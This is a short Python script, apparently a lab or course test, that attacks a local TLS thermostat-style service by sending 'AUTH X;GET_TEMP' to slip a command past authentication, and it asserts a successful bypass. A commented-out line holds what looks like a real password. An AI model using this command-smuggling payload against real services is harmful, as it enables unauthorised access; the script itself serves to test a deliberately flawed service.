#Vulnerability Name - Authentication Bypass
#With no knowledge of the password, execute valid commands against target
import socket
import ssl

def communicate(cmds,p) :
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_verify_locations('./certificate.pem')

    s = ssl.wrap_socket(sock)
    
    s.connect(('',p))
    
    execute = "%s" % cmds

    s.send(execute.encode("utf-8"))
    msg = s.recv(1024)
    return msg.strip()

try:
    infPort = 23456
    incPort = 23457
    resp = communicate("AUTH X;GET_TEMP",incPort)
    #resp = communicate("AUTH !Q#E%T&U8i6y4r2w", incPort)

    print(resp.decode("utf-8"))

    assert(resp != b'Invalid Auth' and resp != b'Bad Command' and resp != b'Invalid Command')

    print("##Successful Authentication Bypass##")

except Exception as ex:
    print (ex)
    assert(1==2)
